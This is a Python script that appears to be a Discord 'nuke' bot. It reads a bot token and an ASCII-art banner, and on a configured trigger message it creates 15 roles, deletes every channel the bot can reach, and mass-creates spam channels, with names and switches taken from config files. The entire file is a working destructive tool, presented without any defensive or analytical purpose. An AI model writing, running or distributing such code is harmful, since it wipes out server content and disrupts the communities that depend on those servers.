import time, discord, pystyle

Client = discord.Client()

Token = pystyle.Write.Input("[!] Token > ", pystyle.Colors.green_to_blue)

def main():

    def deco():

        Title = '''
            :!!*%%%%***!:            
        :!%$@@&&&&&@@&&&&@$*:        
      !%@@@@@@@@@&&&&&&&&#&&@%!      
    !$@@@@@@&&&&&&&&&&&&&&&@&@@$!    
  :%@&&&@&&&#&&&&&&&&&&&&&&&&@@@@%:  
 :@@@&&&&&&&&&&&&&&&&&&&&&&&@@&&@@$: 
:$#&&@&&&&&&&&&&&&&&&&&&&&&@@@@@@&&% 
*#&&&&&&&&&&&&&&&&&&&&&&&@@@@@@@@@@@!
@#&&&&@@@@@@&&&&&&&&&&&&&@@@@@@@@@@@%
&&&&&@@@@@@@@@&&&&&&&&&&&@@@@@@@@@@@$
@&&&&@@@@@@@@@@@&&&&&&&&&&@@@@@@@@@@$
%#&&&&&@@@@@@@@@@&&&&&&&&&&&&&&@@@@@*
:@#&&&&@@@@@@@@@&&&&&&&&&&&&&&&@@@@$:
 !&#&&&@@@@@@@&&&&&&&&&&&&&&&&&@@@@! 
  !&#&&@@@@@&&&&&&&&&&&&&&&&&&@@@$!  
   :$&#@@@&&&&&&&&&&&&&&&&&&&&@@%:   
     !$&@&#&&&&&&&&&&&&&&&&#&@%:     
       :*$&&####&&&&&####&&$*:       
          :!*%$@@&&&@@$%*!:'''
        
        pystyle.System.Clear()

        pystyle.Anime.Fade(pystyle.Center.Center(Title), pystyle.Colors.green_to_blue, pystyle.Colorate.Horizontal, enter=True)
        
    deco()

    def pucci():

    

        @Client.event

        async def on_message(message):

            if message.content == open("Config\\COMMAND.string", "r").read():
                
                if open("Config\\CREATEROLES.bool", "r").read() == "True":
                    N = 15
                    while N !=0:
                        N = N - 1
                        await message.channel.guild.create_role(name=open("Config\\ROLENAMES.string", "r").read())

                if open("Config\\DELETECHANNELS.bool", "r").read() == "True":
                    for c in Client.get_all_channels():
                        await c.delete()

                if open("Config\\CREATECHANNELS.bool", "r").read() == "True":
                    N = int(open("Config\\NUMBEROFCHANNELS.integrer", "r").read())
                    while N !=0:
                        N = N - 1
                        await message.channel.guild.create_text_channel(open("Config\\NAMEOFCHANNELS.string", "r").read())     
                
    pucci()

main()

Client.run(Token)
